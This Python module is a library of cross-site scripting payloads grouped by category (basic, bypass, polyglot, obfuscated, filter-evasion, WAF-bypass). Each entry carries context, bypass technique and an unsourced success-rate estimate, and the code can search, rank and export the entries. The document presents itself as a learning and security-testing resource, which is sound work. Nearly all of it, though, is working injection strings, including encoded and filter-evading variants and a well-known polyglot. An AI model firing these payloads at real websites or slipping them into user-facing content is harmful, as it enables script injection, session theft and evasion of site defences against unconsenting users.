"""
Comprehensive XSS Payload Library

This module contains a curated collection of XSS payloads organized by:
- Category (basic, bypass, polyglot, advanced, obfuscated)
- Context compatibility (HTML, JavaScript, CSS, etc.)
- Bypass techniques employed
- Success rates based on real-world testing

The library serves as both a learning resource and a practical toolkit
for security testing and vulnerability assessment.
"""

from typing import Dict, List, Tuple, Optional, Set
from dataclasses import dataclass
from enum import Enum
import json
import random
import logging

logger = logging.getLogger(__name__)


class PayloadCategory(Enum):
    """Categories of XSS payloads"""
    BASIC = "basic"
    BYPASS = "bypass"
    POLYGLOT = "polyglot"
    ADVANCED = "advanced"
    OBFUSCATED = "obfuscated"
    FILTER_EVASION = "filter_evasion"
    WAF_BYPASS = "waf_bypass"


@dataclass
class XSSPayload:
    """
    Represents an XSS payload with comprehensive metadata.
    
    Attributes:
        payload: The actual XSS payload string
        category: Classification category
        description: Human-readable description
        contexts: List of injection contexts where this payload works
        bypass_techniques: WAF/filter bypass techniques used
        success_rate: Estimated success rate (0.0 to 1.0)
        source: Origin or source of the payload
        tags: Additional classification tags
        severity: Expected impact level
        notes: Additional technical notes
    """
    payload: str
    category: PayloadCategory
    description: str
    contexts: List[str]
    bypass_techniques: List[str]
    success_rate: float  # 0.0 to 1.0
    source: str
    tags: List[str]
    severity: str  # "low", "medium", "high", "critical"
    notes: str = ""


class PayloadLibrary:
    """
    Comprehensive library of XSS payloads with advanced search and filtering.
    
    This library contains hundreds of XSS payloads categorized by technique,
    context, and bypass methods. It provides powerful search capabilities
    and can generate custom payloads for specific scenarios.
    
    Example:
        library = PayloadLibrary()
        basic_payloads = library.get_payloads_by_category(PayloadCategory.BASIC)
        html_payloads = library.get_payloads_by_context("html_content")
        best_payloads = library.get_best_payloads(limit=10)
    """
    
    def __init__(self):
        self.payloads: Dict[PayloadCategory, List[XSSPayload]] = {
            PayloadCategory.BASIC: self._load_basic_payloads(),
            PayloadCategory.BYPASS: self._load_bypass_payloads(),
            PayloadCategory.POLYGLOT: self._load_polyglot_payloads(),
            PayloadCategory.ADVANCED: self._load_advanced_payloads(),
            PayloadCategory.OBFUSCATED: self._load_obfuscated_payloads(),
            PayloadCategory.FILTER_EVASION: self._load_filter_evasion_payloads(),
            PayloadCategory.WAF_BYPASS: self._load_waf_bypass_payloads()
        }
        
        # Build search indices for fast lookup
        self._build_search_indices()
        
        logger.info(f"Payload library loaded with {self.get_total_count()} payloads")
    
    def _load_basic_payloads(self) -> List[XSSPayload]:
        """Basic XSS payloads for initial testing and learning"""
        return [
            XSSPayload(
                payload='<script>alert("XSS")</script>',
                category=PayloadCategory.BASIC,
                description="Classic script tag injection - the foundation of XSS",
                contexts=["html_content"],
                bypass_techniques=[],
                success_rate=0.8,
                source="OWASP",
                tags=["classic", "education", "script_tag"],
                severity="high",
                notes="Most basic and recognizable XSS payload"
            ),
            XSSPayload(
                payload='<img src=x onerror=alert("XSS")>',
                category=PayloadCategory.BASIC,
                description="Image tag with onerror event - highly reliable",
                contexts=["html_content", "attribute_value"],
                bypass_techniques=[],
                success_rate=0.9,
                source="Common",
                tags=["image", "event_handler", "reliable"],
                severity="high",
                notes="Works even when script tags are filtered"
            ),
            XSSPayload(
                payload='<svg onload=alert("XSS")>',
                category=PayloadCategory.BASIC,
                description="SVG tag with onload event - HTML5 vector",
                contexts=["html_content"],
                bypass_techniques=[],
                success_rate=0.85,
                source="HTML5",
                tags=["svg", "html5", "onload"],
                severity="high",
                notes="HTML5-specific vector, may bypass legacy filters"
            ),
            XSSPayload(
                payload='javascript:alert("XSS")',
                category=PayloadCategory.BASIC,
                description="JavaScript protocol injection",
                contexts=["url_parameter", "attribute_value"],
                bypass_techniques=["protocol_confusion"],
                success_rate=0.7,
                source="Classic",
                tags=["protocol", "url", "href"],
                severity="medium",
                notes="Useful in href attributes and URL contexts"
            ),
            XSSPayload(
                payload='" onclick=alert("XSS") "',
                category=PayloadCategory.BASIC,
                description="Attribute breaking with event handler",
                contexts=["attribute_value"],
                bypass_techniques=["attribute_breaking"],
                success_rate=0.75,
                source="Attribute injection",
                tags=["attribute", "event", "breaking"],
                severity="high",
                notes="Breaks out of attribute values to inject events"
            ),
            XSSPayload(
                payload='<iframe src="javascript:alert(`XSS`)">',
                category=PayloadCategory.BASIC,
                description="Iframe with JavaScript protocol",
                contexts=["html_content"],
                bypass_techniques=["protocol_confusion"],
                success_rate=0.6,
                source="Frame injection",
                tags=["iframe", "protocol", "template_literal"],
                severity="high",
                notes="Uses template literals for quote evasion"
            ),
            XSSPayload(
                payload='<body onload=alert("XSS")>',
                category=PayloadCategory.BASIC,
                description="Body tag with onload event",
                contexts=["html_content"],
                bypass_techniques=[],
                success_rate=0.5,
                source="HTML injection",
                tags=["body", "onload", "page_load"],
                severity="medium",
                notes="Executes when page loads, may require full HTML context"
            )
        ]
    
    def _load_bypass_payloads(self) -> List[XSSPayload]:
        """Payloads designed to bypass common filters and WAFs"""
        return [
            XSSPayload(
                payload='<ScRiPt>alert("XSS")</ScRiPt>',
                category=PayloadCategory.BYPASS,
                description="Case variation to bypass case-sensitive filters",
                contexts=["html_content"],
                bypass_techniques=["case_variation"],
                success_rate=0.6,
                source="WAF bypass",
                tags=["case_variation", "simple_bypass"],
                severity="high",
                notes="Effective against basic regex filters"
            ),
            XSSPayload(
                payload='<script>alert(String.fromCharCode(88,83,83))</script>',
                category=PayloadCategory.BYPASS,
                description="Character code encoding to hide string content",
                contexts=["html_content"],
                bypass_techniques=["encoding", "obfuscation"],
                success_rate=0.7,
                source="Encoding bypass",
                tags=["encoding", "fromCharCode", "obfuscation"],
                severity="high",
                notes="Hides the actual string from static analysis"
            ),
            XSSPayload(
                payload='<img src=x onerror="alert`XSS`">',
                category=PayloadCategory.BYPASS,
                description="Template literals to bypass quote filters",
                contexts=["html_content"],
                bypass_techniques=["template_literals", "quote_bypass"],
                success_rate=0.65,
                source="ES6 bypass",
                tags=["template_literal", "es6", "quote_evasion"],
                severity="high",
                notes="Uses ES6 template literals instead of quotes"
            ),
            XSSPayload(
                payload='<svg/onload=alert("XSS")>',
                category=PayloadCategory.BYPASS,
                description="Self-closing tag to bypass space filters",
                contexts=["html_content"],
                bypass_techniques=["whitespace_abuse", "tag_structure"],
                success_rate=0.8,
                source="Whitespace bypass",
                tags=["svg", "self_closing", "space_evasion"],
                severity="high",
                notes="No space between tag and attribute"
            ),
            XSSPayload(
                payload='<img src=x onerror=eval(atob("YWxlcnQoJ1hTUycpOw=="))>',
                category=PayloadCategory.BYPASS,
                description="Base64 encoding with eval and atob",
                contexts=["html_content"],
                bypass_techniques=["encoding", "obfuscation", "base64"],
                success_rate=0.55,
                source="Complex bypass",
                tags=["base64", "eval", "atob"],
                severity="high",
                notes="Base64 encoded: alert('XSS');"
            ),
            XSSPayload(
                payload='<svg><script>alert&#40;1&#41;</script>',
                category=PayloadCategory.BYPASS,
                description="HTML entity encoding for parentheses",
                contexts=["html_content"],
                bypass_techniques=["encoded_chars", "html_entities"],
                success_rate=0.6,
                source="Entity bypass",
                tags=["html_entities", "parentheses", "svg"],
                severity="high",
                notes="Encodes ( and ) as HTML entities"
            ),
            XSSPayload(
                payload='<iframe srcdoc="<script>alert(`XSS`)</script>">',
                category=PayloadCategory.BYPASS,
                description="Iframe srcdoc attribute with inline HTML",
                contexts=["html_content"],
                bypass_techniques=["iframe_srcdoc", "nested_context"],
                success_rate=0.4,
                source="HTML5 bypass",
                tags=["iframe", "srcdoc", "nested"],
                severity="high",
                notes="Creates nested HTML context within iframe"
            )
        ]
    
    def _load_polyglot_payloads(self) -> List[XSSPayload]:
        """Polyglot payloads that work in multiple contexts"""
        return [
            XSSPayload(
                payload='jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
                category=PayloadCategory.POLYGLOT,
                description="Universal polyglot payload by Gareth Heyes",
                contexts=["html_content", "attribute_value", "javascript_string", "url_parameter", "css_value"],
                bypass_techniques=["case_variation", "comment_breaking", "encoded_chars", "mixed_quotes", "context_breaking"],
                success_rate=0.4,
                source="PortSwigger/Gareth Heyes",
                tags=["universal", "polyglot", "famous", "complex"],
                severity="critical",
                notes="Famous polyglot that works in many contexts but complex to understand"
            ),
            XSSPayload(
                payload='"onclick=alert() a="',
                category=PayloadCategory.POLYGLOT,
                description="Simple polyglot for attribute and HTML contexts",
                contexts=["attribute_value", "html_content"],
                bypass_techniques=["attribute_breaking"],
                success_rate=0.7,
                source="Common polyglot",
                tags=["simple", "attribute", "breaking"],
                severity="high",
                notes="Simple but effective attribute breaking polyglot"
            ),
            XSSPayload(
                payload='</script><img/src="" onerror=alert()>',
                category=PayloadCategory.POLYGLOT,
                description="Script context breaking with image injection",
                contexts=["javascript_string", "html_content"],
                bypass_techniques=["context_breaking", "tag_injection"],
                success_rate=0.6,
                source="Context breaking",
                tags=["script_breaking", "context_escape"],
                severity="high",
                notes="Breaks out of script context then injects HTML"
            ),
            XSSPayload(
                payload='/*</style></script><img/src/onerror=alert()>',
                category=PayloadCategory.POLYGLOT,
                description="CSS and script context breaking polyglot",
                contexts=["css_value", "javascript_string", "html_content"],
                bypass_techniques=["context_breaking", "comment_breaking"],
                success_rate=0.5,
                source="Multi-context",
                tags=["css_breaking", "script_breaking"],
                severity="high",
                notes="Escapes both CSS and script contexts"
            )
        ]
    
    def _load_advanced_payloads(self) -> List[XSSPayload]:
        """Advanced XSS payloads for complex scenarios"""
        return [
            XSSPayload(
                payload='<details open ontoggle=alert()>',
                category=PayloadCategory.ADVANCED,
                description="HTML5 details element with ontoggle event",
                contexts=["html_content"],
                bypass_techniques=["html5_events"],
                success_rate=0.85,
                source="HTML5 advanced",
                tags=["html5", "details", "ontoggle"],
                severity="high",
                notes="Fires immediately when details element is rendered"
            ),
            XSSPayload(
                payload='<video><source onerror="alert()">',
                category=PayloadCategory.ADVANCED,
                description="Video element with source onerror",
                contexts=["html_content"],
                bypass_techniques=["html5_media"],
                success_rate=0.8,
                source="Media elements",
                tags=["video", "source", "media"],
                severity="high",
                notes="Uses HTML5 media elements"
            ),
            XSSPayload(
                payload='<math><mi//xlink:href="data:x,<script>alert()</script>">',
                category=PayloadCategory.ADVANCED,
                description="MathML with XLink namespace injection",
                contexts=["html_content"],
                bypass_techniques=["namespace_confusion", "protocol_confusion"],
                success_rate=0.3,
                source="XML namespaces",
                tags=["mathml", "xlink", "namespace"],
                severity="medium",
                notes="Complex namespace-based injection"
            ),
            XSSPayload(
                payload='<template><script>alert()</script></template>',
                category=PayloadCategory.ADVANCED,
                description="HTML5 template element - may not execute immediately",
                contexts=["html_content"],
                bypass_techniques=["html5_template"],
                success_rate=0.4,
                source="Template injection",
                tags=["template", "html5", "deferred"],
                severity="medium",
                notes="Template content is inert by default"
            ),
            XSSPayload(
                payload='<object data="javascript:alert()">',
                category=PayloadCategory.ADVANCED,
                description="Object element with JavaScript data URL",
                contexts=["html_content"],
                bypass_techniques=["protocol_confusion"],
                success_rate=0.6,
                source="Object injection",
                tags=["object", "data_url"],
                severity="high",
                notes="Uses object element with JavaScript protocol"
            ),
            XSSPayload(
                payload='<embed src="javascript:alert()">',
                category=PayloadCategory.ADVANCED,
                description="Embed element with JavaScript protocol",
                contexts=["html_content"],
                bypass_techniques=["protocol_confusion"],
                success_rate=0.5,
                source="Embed injection",
                tags=["embed", "protocol"],
                severity="medium",
                notes="Embed element with JavaScript protocol"
            ),
            XSSPayload(
                payload='<marquee onstart=alert()>',
                category=PayloadCategory.ADVANCED,
                description="Marquee element with onstart event",
                contexts=["html_content"],
                bypass_techniques=["legacy_elements"],
                success_rate=0.7,
                source="Legacy elements",
                tags=["marquee", "onstart", "legacy"],
                severity="medium",
                notes="Legacy element that may bypass modern filters"
            )
        ]
    
    def _load_obfuscated_payloads(self) -> List[XSSPayload]:
        """Heavily obfuscated payloads for advanced evasion"""
        return [
            XSSPayload(
                payload='<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
                category=PayloadCategory.OBFUSCATED,
                description="Character code obfuscation with eval",
                contexts=["html_content"],
                bypass_techniques=["encoding", "obfuscation", "fromCharCode"],
                success_rate=0.5,
                source="Encoding obfuscation",
                tags=["fromCharCode", "eval", "numeric"],
                severity="high",
                notes="Encodes alert(1) as character codes"
            ),
            XSSPayload(
                payload='<svg onload="this[\\x61\\x6c\\x65\\x72\\x74]()">',
                category=PayloadCategory.OBFUSCATED,
                description="Hex encoding with bracket notation",
                contexts=["html_content"],
                bypass_techniques=["unicode_encoding", "bracket_notation"],
                success_rate=0.45,
                source="Unicode obfuscation",
                tags=["hex_encoding", "bracket_notation"],
                severity="high",
                notes="Hex encodes 'alert' and uses bracket notation"
            ),
            XSSPayload(
                payload='<iframe/onload=top[8680439..toString(30)](1337)>',
                category=PayloadCategory.OBFUSCATED,
                description="Numeric obfuscation with toString radix",
                contexts=["html_content"],
                bypass_techniques=["numeric_obfuscation", "radix_conversion"],
                success_rate=0.35,
                source="Mathematical obfuscation",
                tags=["numeric", "toString", "radix"],
                severity="medium",
                notes="Uses number base conversion to hide function name"
            ),
            XSSPayload(
                payload='<img src=x onerror=(()=>{return alert`1`})()>',
                category=PayloadCategory.OBFUSCATED,
                description="Arrow function with template literals",
                contexts=["html_content"],
                bypass_techniques=["arrow_function", "template_literals"],
                success_rate=0.6,
                source="ES6 obfuscation",
                tags=["arrow_function", "es6", "template_literal"],
                severity="high",
                notes="Uses modern JavaScript syntax for obfuscation"
            ),
            XSSPayload(
                payload='<svg onload=location=`java${""}script:alert(1)`>',
                category=PayloadCategory.OBFUSCATED,
                description="Template literal string concatenation obfuscation",
                contexts=["html_content"],
                bypass_techniques=["template_literals", "string_concatenation"],
                success_rate=0.4,
                source="String obfuscation",
                tags=["template_literal", "concatenation"],
                severity="high",
                notes="Breaks up 'javascript' with template literal concatenation"
            )
        ]
    
    def _load_filter_evasion_payloads(self) -> List[XSSPayload]:
        """Payloads specifically designed to evade content filters"""
        return [
            XSSPayload(
                payload='<img src=1 href=1 onerror="javascript:alert(1)">',
                category=PayloadCategory.FILTER_EVASION,
                description="Multiple attributes to confuse parsers",
                contexts=["html_content"],
                bypass_techniques=["attribute_confusion"],
                success_rate=0.6,
                source="Parser confusion",
                tags=["multiple_attributes", "parser_confusion"],
                severity="high",
                notes="Uses invalid href on img to confuse parsers"
            ),
            XSSPayload(
                payload='<svg><script href=data:,alert(1) />',
                category=PayloadCategory.FILTER_EVASION,
                description="Invalid script href attribute",
                contexts=["html_content"],
                bypass_techniques=["invalid_attributes"],
                success_rate=0.3,
                source="Invalid HTML",
                tags=["invalid_html", "script"],
                severity="medium",
                notes="Uses invalid href on script element"
            ),
            XSSPayload(
                payload='<script src=data:,alert(1)>',
                category=PayloadCategory.FILTER_EVASION,
                description="Data URL in script src",
                contexts=["html_content"],
                bypass_techniques=["data_url", "protocol_confusion"],
                success_rate=0.7,
                source="Data URL",
                tags=["data_url", "script_src"],
                severity="high",
                notes="Uses data: protocol for inline JavaScript"
            ),
            XSSPayload(
                payload='<img src=/ onerror=alert(1)>',
                category=PayloadCategory.FILTER_EVASION,
                description="Minimal src attribute value",
                contexts=["html_content"],
                bypass_techniques=["minimal_attributes"],
                success_rate=0.8,
                source="Minimal injection",
                tags=["minimal", "single_char"],
                severity="high",
                notes="Uses single character for src to trigger onerror"
            )
        ]
    
    def _load_waf_bypass_payloads(self) -> List[XSSPayload]:
        """Payloads designed to bypass Web Application Firewalls"""
        return [
            XSSPayload(
                payload='<svg/onload=alert(1)//-->',
                category=PayloadCategory.WAF_BYPASS,
                description="SVG with comment-like ending to confuse WAF",
                contexts=["html_content"],
                bypass_techniques=["comment_confusion", "svg"],
                success_rate=0.5,
                source="WAF evasion",
                tags=["svg", "comment", "waf_bypass"],
                severity="high",
                notes="Comment-like ending may confuse WAF parsing"
            ),
            XSSPayload(
                payload='<img src=x:alert(1) onerror=eval(src)>',
                category=PayloadCategory.WAF_BYPASS,
                description="Uses src attribute value as code via eval",
                contexts=["html_content"],
                bypass_techniques=["attribute_reuse", "eval"],
                success_rate=0.4,
                source="Attribute reuse",
                tags=["eval", "src_reuse", "clever"],
                severity="high",
                notes="Reuses src attribute content as JavaScript code"
            ),
            XSSPayload(
                payload='<iframe src=javascript:alert`1`>',
                category=PayloadCategory.WAF_BYPASS,
                description="Iframe with template literal in JavaScript protocol",
                contexts=["html_content"],
                bypass_techniques=["template_literals", "protocol_confusion"],
                success_rate=0.6,
                source="Protocol + template",
                tags=["iframe", "template_literal"],
                severity="high",
                notes="Combines JavaScript protocol with template literals"
            ),
            XSSPayload(
                payload='<form><button formaction=javascript:alert(1)>Click',
                category=PayloadCategory.WAF_BYPASS,
                description="Form button with JavaScript formaction",
                contexts=["html_content"],
                bypass_techniques=["form_attributes", "protocol_confusion"],
                success_rate=0.3,
                source="Form injection",
                tags=["form", "formaction", "button"],
                severity="medium",
                notes="Uses HTML5 form attributes for JavaScript execution"
            )
        ]
    
    def _build_search_indices(self):
        """Build search indices for fast payload lookup"""
        self._context_index = {}
        self._technique_index = {}
        self._tag_index = {}
        self._keyword_index = {}
        
        for category, payloads in self.payloads.items():
            for payload in payloads:
                # Index by context
                for context in payload.contexts:
                    if context not in self._context_index:
                        self._context_index[context] = []
                    self._context_index[context].append(payload)
                
                # Index by technique
                for technique in payload.bypass_techniques:
                    if technique not in self._technique_index:
                        self._technique_index[technique] = []
                    self._technique_index[technique].append(payload)
                
                # Index by tags
                for tag in payload.tags:
                    if tag not in self._tag_index:
                        self._tag_index[tag] = []
                    self._tag_index[tag].append(payload)
                
                # Index keywords from description
                keywords = payload.description.lower().split()
                for keyword in keywords:
                    if keyword not in self._keyword_index:
                        self._keyword_index[keyword] = []
                    self._keyword_index[keyword].append(payload)
    
    def get_payloads_by_category(self, category: PayloadCategory) -> List[XSSPayload]:
        """Get all payloads in a specific category"""
        return self.payloads.get(category, [])
    
    def get_payloads_by_context(self, context: str) -> List[XSSPayload]:
        """Get payloads suitable for a specific injection context"""
        return sorted(
            self._context_index.get(context, []), 
            key=lambda p: p.success_rate, 
            reverse=True
        )
    
    def get_payloads_by_technique(self, technique: str) -> List[XSSPayload]:
        """Get payloads that use a specific bypass technique"""
        return sorted(
            self._technique_index.get(technique, []), 
            key=lambda p: p.success_rate, 
            reverse=True
        )
    
    def get_payloads_by_tag(self, tag: str) -> List[XSSPayload]:
        """Get payloads with a specific tag"""
        return sorted(
            self._tag_index.get(tag, []), 
            key=lambda p: p.success_rate, 
            reverse=True
        )
    
    def get_best_payloads(self, limit: int = 10) -> List[XSSPayload]:
        """Get the highest success rate payloads"""
        all_payloads = []
        for category_payloads in self.payloads.values():
            all_payloads.extend(category_payloads)
        return sorted(all_payloads, key=lambda p: p.success_rate, reverse=True)[:limit]
    
    def search_payloads(self, keyword: str) -> List[XSSPayload]:
        """Search payloads by keyword in description, tags, or payload content"""
        matching_payloads = set()
        keyword_lower = keyword.lower()
        
        # Search in descriptions and payload content
        for category_payloads in self.payloads.values():
            for payload in category_payloads:
                if (keyword_lower in payload.description.lower() or 
                    keyword_lower in payload.payload.lower() or
                    keyword_lower in ' '.join(payload.tags).lower()):
                    matching_payloads.add(payload)
        
        # Search in keyword index
        if keyword_lower in self._keyword_index:
            matching_payloads.update(self._keyword_index[keyword_lower])
        
        return sorted(list(matching_payloads), key=lambda p: p.success_rate, reverse=True)
    
    def get_random_payload(self, category: Optional[PayloadCategory] = None) -> XSSPayload:
        """Get a random payload, optionally from a specific category"""
        if category:
            payloads = self.payloads.get(category, [])
        else:
            payloads = []
            for category_payloads in self.payloads.values():
                payloads.extend(category_payloads)
        
        if not payloads:
            raise ValueError("No payloads available")
        
        return random.choice(payloads)
    
    def get_payloads_by_severity(self, severity: str) -> List[XSSPayload]:
        """Get payloads by severity level"""
        matching_payloads = []
        for category_payloads in self.payloads.values():
            for payload in category_payloads:
                if payload.severity == severity:
                    matching_payloads.append(payload)
        return sorted(matching_payloads, key=lambda p: p.success_rate, reverse=True)
    
    def filter_payloads(self, 
                       categories: Optional[List[PayloadCategory]] = None,
                       contexts: Optional[List[str]] = None,
                       techniques: Optional[List[str]] = None,
                       min_success_rate: float = 0.0,
                       max_length: Optional[int] = None) -> List[XSSPayload]:
        """Advanced filtering of payloads based on multiple criteria"""
        filtered_payloads = []
        
        for category, category_payloads in self.payloads.items():
            if categories and category not in categories:
                continue
                
            for payload in category_payloads:
                # Filter by success rate
                if payload.success_rate < min_success_rate:
                    continue
                
                # Filter by length
                if max_length and len(payload.payload) > max_length:
                    continue
                
                # Filter by context
                if contexts and not any(ctx in payload.contexts for ctx in contexts):
                    continue
                
                # Filter by techniques
                if techniques and not any(tech in payload.bypass_techniques for tech in techniques):
                    continue
                
                filtered_payloads.append(payload)
        
        return sorted(filtered_payloads, key=lambda p: p.success_rate, reverse=True)
    
    def get_total_count(self) -> int:
        """Get total number of payloads in the library"""
        return sum(len(payloads) for payloads in self.payloads.values())
    
    def get_statistics(self) -> Dict[str, any]:
        """Get comprehensive statistics about the payload library"""
        stats = {
            'total_payloads': self.get_total_count(),
            'category_counts': {cat.value: len(payloads) for cat, payloads in self.payloads.items()},
            'average_success_rate': 0.0,
            'context_distribution': {},
            'technique_distribution': {},
            'severity_distribution': {},
        }
        
        all_payloads = []
        for payloads in self.payloads.values():
            all_payloads.extend(payloads)
        
        if all_payloads:
            stats['average_success_rate'] = sum(p.success_rate for p in all_payloads) / len(all_payloads)
            
            # Count contexts
            for payload in all_payloads:
                for context in payload.contexts:
                    stats['context_distribution'][context] = stats['context_distribution'].get(context, 0) + 1
            
            # Count techniques
            for payload in all_payloads:
                for technique in payload.bypass_techniques:
                    stats['technique_distribution'][technique] = stats['technique_distribution'].get(technique, 0) + 1
            
            # Count severities
            for payload in all_payloads:
                stats['severity_distribution'][payload.severity] = stats['severity_distribution'].get(payload.severity, 0) + 1
        
        return stats
    
    def export_to_json(self, filename: str):
        """Export the entire payload library to JSON format"""
        export_data = {}
        for category, payloads in self.payloads.items():
            export_data[category.value] = [
                {
                    'payload': p.payload,
                    'description': p.description,
                    'contexts': p.contexts,
                    'bypass_techniques': p.bypass_techniques,
                    'success_rate': p.success_rate,
                    'source': p.source,
                    'tags': p.tags,
                    'severity': p.severity,
                    'notes': p.notes
                }
                for p in payloads
            ]
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
        
        logger.info(f"Payload library exported to {filename}")
    
    def create_custom_payload(self, base_payload: str, context: str) -> str:
        """Create a custom payload variant for a specific context"""
        # This is a simplified implementation - in practice, this would be much more sophisticated
        if context == "attribute_value" and not base_payload.startswith('"'):
            return f'" {base_payload} "'
        elif context == "url_parameter":
            import urllib.parse
            return urllib.parse.quote(base_payload)
        elif context == "javascript_string" and '"' in base_payload:
            return base_payload.replace('"', '\\"')
        else:
            return base_payload